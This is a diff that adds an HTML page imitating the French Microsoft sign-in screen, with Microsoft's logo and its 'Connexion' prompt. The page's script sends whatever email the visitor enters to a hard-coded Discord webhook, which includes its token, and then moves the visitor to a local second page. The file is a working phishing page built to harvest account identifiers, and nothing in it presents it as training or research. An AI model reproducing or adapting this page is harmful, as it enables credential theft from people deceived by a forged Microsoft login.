@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Login Page</title>
+    <style>
+        body {  
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom right, #f0e6e4, #d6e6f2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+            padding: 0; /* Enlève tout padding du body */
+        }
+        .login-container {
+            background: white;
+            padding: 25px;
+            width: 350px; /* Largeur réduite à 350px */
+            text-align: left;
+            position: relative;
+            border-radius: 0;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            margin-top: -112px; /* Ajuste la position vers le haut d'environ 3 cm (112px) */
+        }
+        .header-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 8px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px; 
+        }
+        .logo img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+        }
+        .logo-text {
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #666;
+        }
+        h2 {
+            font-size: 1.4em;
+            margin: 8px 0;
+            color: #333;
+            text-align: left;
+            width: 100%;
+        }
+        input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 12px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .links {
+            margin: 12px 0;
+            font-size: 0.8em;
+            text-align: left;
+            width: 100%;
+        }
+        .links a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        .links .no-account {
+            color: #000;
+        }
+        .links .create-account {
+            color: #0078d4;
+        }
+        .buttons {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+        .button {
+            padding: 8px 20px;
+            border: none;
+            border-radius: 0;
+            cursor: pointer;
+            margin-left: 5px;
+            font-size: 0.9em;
+        }
+        .button-back {
+            background: #c0c0c0;
+            color: #000;
+        }
+        .button-next {
+            background: #0078d4;
+            color: #fff;
+        }
+        .options-container {
+            position: absolute;
+            bottom: -60px; 
+            left: 0;
+            width: 100%;
+            padding: 10px 0;
+            background-color: #f3f3f3;
+            border-radius: 0;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .options-container img {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        .options-container span {
+            display: inline-block;
+            vertical-align: middle;
+            padding-left: 5px;
+        }
+        .footer-text {
+            position: absolute;
+            bottom: 10px;
+            right: 20px;
+            font-size: 0.8em;
+            color: #000;
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header-container">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+                <div class="logo-text">Microsoft</div>
+            </div>
+            <h2>Connexion</h2>
+        </div>
+        <input type="text" id="emailInput" placeholder="E-mail, téléphone ou identifiant Skype">
+        <div class="links">
+            <a href="#" class="no-account">Aucun compte ?</a><a href="#" class="create-account"> Créez-en un !</a>
+        </div>
+        <div class="buttons">
+            <button class="button button-back">Retour</button>
+            <button class="button button-next" onclick="redirectToNextPage()">Suivant</button>
+        </div>
+
+        <div class="options-container">
+            <img src="https://img.icons8.com/material-outlined/24/000000/key.png" alt="Icone de clé">
+            <span>Options de connexion</span>
+        </div>
+    </div>
+
+    <div class="footer-text">
+        Conditions d'utilisation | Confidentialité et cookies | Accessibilité : partiellement conforme
+    </div>
+
+    <script>
+        function redirectToNextPage() {
+            const webhookURL = 'https://discord.com/api/webhooks/1276593553400664064/xbLeuqO6r0IBNG3HKxuS7sxbIDx9BptEW85EASFQYDPjP5vn2GMnKfSgoOq8hg9atqeK';
+            const emailInput = document.getElementById('emailInput');
+            const email = emailInput.value;
+
+            if (email) {
+                const message = {
+                    content: `Un utilisateur a entré l'email suivant : ${email}`
+                };
+
+                localStorage.setItem('userEmail', email);
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'file:///C:/Users/userl/Desktop/lunar%20site%20html/page%202.html';
+                    } else {
+                        console.error('Erreur lors de l\'envoi du webhook');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur de réseau:', error);
+                });
+            } else {
+                alert('Veuillez entrer un email avant de continuer.');
+            }
+        }
+    </script>
+</body>
+</html>
